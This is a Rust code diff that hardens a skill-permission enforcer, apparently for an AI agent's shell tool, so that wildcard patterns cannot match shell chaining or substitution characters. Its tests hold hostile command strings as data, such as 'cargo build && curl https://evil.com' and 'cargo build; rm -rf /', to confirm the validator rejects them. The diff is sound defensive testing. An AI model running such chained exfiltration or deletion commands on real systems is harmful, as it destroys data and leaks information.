@@ -154,6 +154,61 @@ fn glob_to_regex(glob: &str) -> Result<String, PatternError> {
     Ok(regex)
 }
 
+/// Convert a shell-command glob pattern to a regex string.
+///
+/// Shell patterns use stricter wildcard expansion than file-path globs:
+/// `*` and `**` do not match shell metacharacters that enable chaining,
+/// redirection, or command substitution.
+fn glob_to_shell_regex(glob: &str) -> Result<String, PatternError> {
+    // Validate characters
+    for c in glob.chars() {
+        if !is_valid_pattern_char(c) {
+            return Err(PatternError::InvalidCharacter {
+                pattern: glob.to_string(),
+                character: c,
+            });
+        }
+    }
+
+    // Block common shell operators from wildcard expansion.
+    const SHELL_SAFE_STAR_NO_SLASH: &str = r"[^/;&|`$<>\r\n]*";
+    const SHELL_SAFE_STAR_WITH_SLASH: &str = r"[^;&|`$<>\r\n]*";
+
+    let mut regex = String::with_capacity(glob.len() * 2 + 2);
+    regex.push('^');
+
+    let chars: Vec<char> = glob.chars().collect();
+    let mut i = 0;
+    while i < chars.len() {
+        if chars[i] == '*' && i + 1 < chars.len() && chars[i + 1] == '*' {
+            i += 2;
+            if i < chars.len() && chars[i] == '/' {
+                // **/ matches zero or more safe segments ending in slash.
+                regex.push_str("([^;&|`$<>\\r\\n]*/)?");
+                i += 1;
+            } else {
+                // ** matches anything (including /) except shell metacharacters.
+                regex.push_str(SHELL_SAFE_STAR_WITH_SLASH);
+            }
+        } else if chars[i] == '*' {
+            // * matches anything except / and shell metacharacters.
+            regex.push_str(SHELL_SAFE_STAR_NO_SLASH);
+            i += 1;
+        } else {
+            // Escape regex-special characters
+            let c = chars[i];
+            if ".+^${}()|[]\\".contains(c) {
+                regex.push('\\');
+            }
+            regex.push(c);
+            i += 1;
+        }
+    }
+
+    regex.push('$');
+    Ok(regex)
+}
+
 /// A compiled pattern ready for matching.
 struct CompiledPattern {
     regex: regex::Regex,
@@ -162,6 +217,18 @@ struct CompiledPattern {
 impl CompiledPattern {
     fn new(glob: &str) -> Result<Self, PatternError> {
         let regex_str = glob_to_regex(glob)?;
+        let regex = RegexBuilder::new(&regex_str)
+            .size_limit(MAX_REGEX_SIZE)
+            .build()
+            .map_err(|e| PatternError::CompilationFailed {
+                pattern: glob.to_string(),
+                reason: e.to_string(),
+            })?;
+        Ok(Self { regex })
+    }
+
+    fn new_shell(glob: &str) -> Result<Self, PatternError> {
+        let regex_str = glob_to_shell_regex(glob)?;
         let regex = RegexBuilder::new(&regex_str)
             .size_limit(MAX_REGEX_SIZE)
             .build()
@@ -302,16 +369,18 @@ impl SkillPermissionEnforcer {
 
             for pattern in &perm.patterns {
                 match pattern {
-                    SerializedPattern::Shell { command } => match CompiledPattern::new(command) {
-                        Ok(cp) => compiled.shell.push(cp),
-                        Err(e) => {
-                            tracing::warn!(
-                                tool_name = tool_name.as_str(),
-                                "Bad serialized shell pattern: {}",
-                                e
-                            );
+                    SerializedPattern::Shell { command } => {
+                        match CompiledPattern::new_shell(command) {
+                            Ok(cp) => compiled.shell.push(cp),
+                            Err(e) => {
+                                tracing::warn!(
+                                    tool_name = tool_name.as_str(),
+                                    "Bad serialized shell pattern: {}",
+                                    e
+                                );
+                            }
                         }
-                    },
+                    }
                     SerializedPattern::FilePath { path } => match CompiledPattern::new(path) {
                         Ok(cp) => compiled.file_path.push(cp),
                         Err(e) => {
@@ -613,6 +682,16 @@ mod tests {
         assert!(result.is_err());
     }
 
+    #[test]
+    fn test_glob_to_shell_regex_blocks_shell_metacharacters() {
+        let re_str = glob_to_shell_regex("cargo *").unwrap();
+        let re = regex::Regex::new(&re_str).unwrap();
+        assert!(re.is_match("cargo build"));
+        assert!(!re.is_match("cargo build && curl https://evil.com"));
+        assert!(!re.is_match("cargo build; rm -rf /"));
+        assert!(!re.is_match("cargo build | cat"));
+    }
+
     // -----------------------------------------------------------------------
     // No skills / no patterns passthrough
     // -----------------------------------------------------------------------
@@ -700,6 +779,25 @@ mod tests {
         assert!(
             enforcer
                 .validate_tool_call("shell", &params(&[("command", "cargo fmt --check")]))
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn test_shell_wildcard_does_not_allow_command_chaining() {
+        let skill = make_skill(
+            "builder",
+            SkillTrust::Verified,
+            [("shell".to_string(), shell_patterns(&["cargo *"]))].into(),
+        );
+        let enforcer = SkillPermissionEnforcer::from_active_skills(&[skill]);
+
+        assert!(
+            enforcer
+                .validate_tool_call(
+                    "shell",
+                    &params(&[("command", "cargo build && curl https://evil.com")])
+                )
                 .is_err()
         );
     }
